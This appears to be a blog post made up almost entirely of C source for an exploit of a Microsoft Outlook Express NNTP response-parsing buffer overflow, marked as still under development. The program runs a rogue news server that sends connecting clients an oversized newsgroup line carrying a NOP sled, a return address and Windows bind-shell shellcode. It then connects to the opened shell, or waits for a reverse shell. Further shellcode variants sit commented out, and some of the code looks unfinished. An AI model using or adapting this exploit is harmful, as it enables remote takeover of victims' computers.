(Comment on this)
1:23 pm 	
Microsoft Outlook Express NNTP Response Parsing Buffer Overflow

under development...

#include

#define RED	"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

#define PORT	119

int isip ( char *ip );
int shell ( int s, char* tip, unsigned short cbport );

void connect_to_bindshell ( char* tip, unsigned short bport );
void exploit ( int s, int option );
void header ();
void start_reverse_handler ( unsigned short cbport );
void wait ( int sec );

/*********************
* Windows Shellcode *
*********************/

/*
 * win32_bind
 * removed a lot of bad chars
 */

unsigned char scode[] =
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0f"
"\xf8\xfd\x75\x83\xeb\xfc\xe2\xf4\xf3\x92\x16\x38\xe7\x01\x02\x8a"
"\xf0\x98\x76\x19\x2b\xdc\x76\x30\x33\x73\x81\x70\x77\xf9\x12\xfe"
"\x40\xe0\x76\x2a\x2f\xf9\x16\x3c\x84\xcc\x76\x74\xe1\xc9\x3d\xec"
"\xa3\x7c\x3d\x01\x08\x39\x37\x78\x0e\x3a\x16\x81\x34\xac\xd9\x5d"
"\x7a\x1d\x76\x2a\x2b\xf9\x16\x13\x84\xf4\xb6\xfe\x50\xe4\xfc\x9e"
"\x0c\xd4\x76\xfc\x63\xdc\xe1\x14\xcc\xc9\x26\x11\x84\xbb\xcd\xfe"
"\x4f\xf4\x76\x05\x13\x55\x76\x35\x07\xa6\x95\xfb\x41\xf6\x11\x25"
"\xf0\x2e\x9b\x26\x69\x90\xce\x47\x67\x8f\x8e\x47\x50\xac\x02\xa5"
"\x67\x33\x10\x89\x34\xa8\x02\xa3\x50\x71\x18\x13\x8e\x15\xf5\x77"
"\x5a\x92\xff\x8a\xdf\x90\x24\x7c\xfa\x55\xaa\x8a\xd9\xab\xae\x26"
"\x5c\xab\xbe\x26\x4c\xab\x02\xa5\x69\x90\xec\x29\x69\xab\x74\x94"
"\x9a\x90\x59\x6f\x7f\x3f\xaa\x8a\xd9\x92\xed\x24\x5a\x07\x2d\x1d"
"\xab\x55\xd3\x9c\x58\x07\x2b\x26\x5a\x07\x2d\x1d\xea\xb1\x7b\x3c"
"\x58\x07\x2b\x25\x5b\xac\xa8\x8a\xdf\x6b\x95\x92\x76\x3e\x84\x22"
"\xf0\x2e\xa8\x8a\xdf\x9e\x97\x11\x69\x90\x9e\x18\x86\x1d\x97\x25"
"\x56\xd1\x31\xfc\xe8\x92\xb9\xfc\xed\xc9\x3d\x86\xa5\x06\xbf\x58"
"\xf1\xba\xd1\xe6\x82\x82\xc5\xde\xa4\x53\x95\x07\xf1\x4b\xeb\x8a"
"\x7a\xbc\x02\xa3\x54\xaf\xaf\x24\x5e\xa9\x97\x74\x5e\xa9\xa8\x24"
"\xf0\x28\x95\xd8\xd6\xfd\x33\x26\xf0\x2e\x97\x8a\xf0\xcf\x02\xa5"
"\x84\xaf\x01\xf6\xcb\x9c\x02\xa3\x5d\x07\x2d\x1d\xff\x72\xf9\x2a"
"\x5c\x07\x2b\x8a\xdf\xf8\xfd\x75";

/*
unsigned char bindshell[] =
"\x31\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x92"
"\x35\x88\x95\x83\xeb\xfc\xe2\xf4\x6e\x5f\x63\xda\x7a\xcc\x77\x6a"
"\x6d\x55\x03\xf9\xb6\x11\x03\xd0\xae\xbe\xf4\x90\xea\x34\x67\x1e"
"\xdd\x2d\x03\xca\xb2\x34\x63\x76\xa2\x7c\x03\xa1\x19\x34\x66\xa4"
"\x52\xac\x24\x11\x52\x41\x8f\x54\x58\x38\x89\x57\x79\xc1\xb3\xc1"
"\xb6\x1d\xfd\x76\x19\x6a\xac\x94\x79\x53\x03\x99\xd9\xbe\xd7\x89"
"\x93\xde\x8b\xb9\x19\xbc\xe4\xb1\x8e\x54\x4b\xa4\x52\x51\x03\xd5"
"\xa2\xbe\xc8\x99\x19\x45\x94\x38\x19\x75\x80\xcb\xfa\xbb\xc6\x9b"
"\x7e\x65\x77\x43\xa3\xee\xee\xc6\xf4\x5d\xbb\xa7\xfa\x42\xfb\xa7"
"\xcd\x61\x77\x45\xfa\xfe\x65\x69\xa9\x65\x77\x43\xcd\xbc\x6d\xf3"
"\x13\xd8\x80\x97\xc7\x5f\x8a\x6a\x42\x5d\x51\x9c\x67\x98\xdf\x6a"
"\x44\x66\xdb\xc6\xc1\x66\xcb\xc6\xd1\x66\x77\x45\xf4\x5d\x99\xc9"
"\xf4\x66\x01\x74\x07\x5d\x2c\x8f\xe2\xf2\xdf\x6a\x44\x5f\x98\xc4"
"\xc7\xca\x58\xfd\x36\x98\xa6\x7c\xc5\xca\x5e\xc6\xc7\xca\x58\xfd"
"\x77\x7c\x0e\xdc\xc5\xca\x5e\xc5\xc6\x61\xdd\x6a\x42\xa6\xe0\x72"
"\xeb\xf3\xf1\xc2\x6d\xe3\xdd\x6a\x42\x53\xe2\xf1\xf4\x5d\xeb\xf8"
"\x1b\xd0\xe2\xc5\xcb\x1c\x44\x1c\x75\x5f\xcc\x1c\x70\x04\x48\x66"
"\x38\xcb\xca\xb8\x6c\x77\xa4\x06\x1f\x4f\xb0\x3e\x39\x9e\xe0\xe7"
"\x6c\x86\x9e\x6a\xe7\x71\x77\x43\xc9\x62\xda\xc4\xc3\x64\xe2\x94"
"\xc3\x64\xdd\xc4\x6d\xe5\xe0\x38\x4b\x30\x46\xc6\x6d\xe3\xe2\x6a"
"\x6d\x02\x77\x45\x19\x62\x74\x16\x56\x51\x77\x43\xc0\xca\x58\xfd"
"\x62\xbf\x8c\xca\xc1\xca\x5e\x6a\x42\x35\x88\x95";

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";
*/

unsigned char shakehand1[] =
"\x32\x30\x30\x20\x52\x65\x61\x64\x79\x20\x2d\x20\x70\x6f\x73\x74"
"\x69\x6e\x67\x20\x61\x6c\x6c\x6f\x77\x65\x64\x2e\x0d\x0a";

unsigned char shakehand2[] =
"\x32\x31\x35\x20\x4c\x69\x73\x74\x20\x6f\x66\x20\x6e\x65\x77\x73"
"\x67\x72\x6f\x75\x70\x73\x20\x66\x6f\x6c\x6c\x6f\x77\x73\x2e\x0d"
"\x0a";

/*
unsigned char jumper[] =
"\xe9\x00\x00\xff\xff"; //jmp -xxxx
*/

int
isip ( char *ip )
{
	int a, b, c, d;

	if ( !sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d ) )
		return ( 0 );
	if ( a < 1 )
		return ( 0 );
	if ( a > 255 )
		return 0;
	if ( b < 0 )
		return 0;
	if ( b > 255 )
		return 0;
	if ( c < 0 )
		return 0;
	if ( c > 255 )
		return 0;
	if ( d < 0 )
		return 0;
	if ( d > 255 )
		return 0;
	return 1;
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
        {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip, bport );
}

void
exploit ( int s, int option )
{
	char in[1024];
	char out[32000];
	char a[23600];

	//msoeres.dll - 5.50.4807.1700 - Englisch (USA)

	unsigned long callebx1 = 0x60209371;

	printf ( "--[ shaking hands #1..." );
	if ( send ( s, shakehand1, sizeof ( shakehand1 ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );
	bzero ( &in, sizeof ( in ) );
	printf ( "--[ reply: " );
	if ( recv ( s, in, sizeof ( in ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "%s", in );
	printf ( "--[ shaking hands #2..." );
	if ( send ( s, shakehand1, sizeof ( shakehand1 ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );
	bzero ( &in, sizeof ( in ) );
	printf ( "--[ reply: " );
	if ( recv ( s, in, sizeof ( in ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "%s", in );
	printf ( "--[ shaking hands #3..." );
	if ( send ( s, shakehand2, sizeof ( shakehand2 ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );

	bzero ( &a, sizeof ( a ) );
	memset ( a, 0x90, sizeof ( a ) );
	memcpy ( a + 9623, "\xeb\x08", 2 );
	memcpy ( a + 9627, ( unsigned char* ) &callebx1, 4 );

/*
	if ( option == 0 )
		memcpy ( a + 9647, reverseshell, sizeof ( reverseshell ) -1 );
	else
		memcpy ( a + 9647, bindshell, sizeof ( bindshell ) -1 );
*/
	memcpy ( a + 9640, scode, sizeof ( scode ) -1 );

	bzero ( &out, sizeof ( out ) );
	snprintf ( out, sizeof ( out ) -1, "alt.12hr 0%s000001325 0000001322 y\r\n", a );
	printf ( "--[ sending bad newsgroup..." );
	if ( send ( s, out, strlen ( out ), 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );

	close ( s );
}

/*
void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}
*/

void
start_reverse_handler ( unsigned short cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[ incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s1, s2;
	unsigned long lip;
	unsigned long xoredip;
	unsigned short cbport, xoredcbport;
	char* ip;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	if ( argc != 1 )
		if ( argc != 3 )
		{
			fprintf ( stderr, "Usage\n\nBindshell: %s\nReverseshell: %s  \n", argv[0] );
			exit ( 1 );
		}

	//system ( "clear" );
	//header ();

	if ( argc == 3 )
	{
		if ( !isip ( argv[1] ) )
		{
			printf ( "--[ Invalid connectback IP!\n" );
			exit ( 1 );
		}
	}

	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
		exit ( 1 );

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );

	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	printf ( "--[ Microsoft Outlook Express NNTP Response Parsing Buffer Overflow\n" );
	printf ( "--[ listening..." );

	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( RED "FAILED!\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "OK!\n" NORMAL );

	clilen = sizeof ( cliaddr );

	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
			exit ( 1 );

	close ( s1 );

	printf ( "--[" GREEN " Incomming connection from:\t %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );

	if ( argc == 3 )
	{
		printf ( "--[" YELLOW " using connect back shellcode!\n" NORMAL );
		xoredip = inet_addr ( argv[1] ) ^ ( unsigned long  ) 0x99999999;
		xoredcbport = htons ( atoi ( argv[2] ) ) ^ ( unsigned short ) 0x9999;

		memcpy ( &reverseshell[111], &xoredip, 4);
		memcpy ( &reverseshell[118], &xoredcbport, 2);

		sscanf ( argv[2], "%u", &cbport );

		exploit ( s2, 0 );
		start_reverse_handler ( cbport );
	}
	else
	{
		printf ( "--[" YELLOW " using bind shellcode!\n" NORMAL );
		ip = ( char* ) inet_ntoa ( cliaddr.sin_addr );
		exploit ( s2, 1 );
		connect_to_bindshell ( ip, 4444 );
	}
}
